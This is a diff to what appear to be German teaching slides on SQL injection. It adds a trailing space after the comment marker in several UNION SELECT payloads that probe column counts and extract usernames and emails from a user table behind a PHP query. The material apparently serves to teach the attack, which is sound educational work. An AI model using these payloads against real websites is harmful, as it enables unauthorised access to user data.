@@ -178,7 +178,7 @@ Aufgabe: Werde störende Zeichen los, indem du sie auskommentierst
 
 ## Zweiter Versuch
 
-Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user; --</span>
+Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user; -- </span>
 
 ( **Wichtig:** Leerzeichen nach Begrenzungssymbol )
 
@@ -224,7 +224,7 @@ $sql = "SELECT *
 
 ## Was sollen wir tun? Durchprobieren!
 
-Eingabe: <span style="color:crimson">#dog' UNION SELECT 1; --</span>
+Eingabe: <span style="color:crimson">#dog' UNION SELECT 1; -- </span>
 
 ```php
 $sql = "SELECT *
@@ -240,7 +240,7 @@ $sql = "SELECT *
 
 ## Was sollen wir tun? Durchprobieren!
 
-Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2; --</span>
+Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2; -- </span>
 
 ```php
 $sql = "SELECT * 
@@ -256,7 +256,7 @@ $sql = "SELECT *
 
 ## Was sollen wir tun? Durchprobieren!
 
-Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; --</span>
+Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; -- </span>
 
 ```php
 $sql = "SELECT *
@@ -278,7 +278,7 @@ $sql = "SELECT *
 <br />
 <br />
 
-Eingabe: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; --</span>
+Eingabe: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; -- </span>
 
 ```php
 $sql = "SELECT *
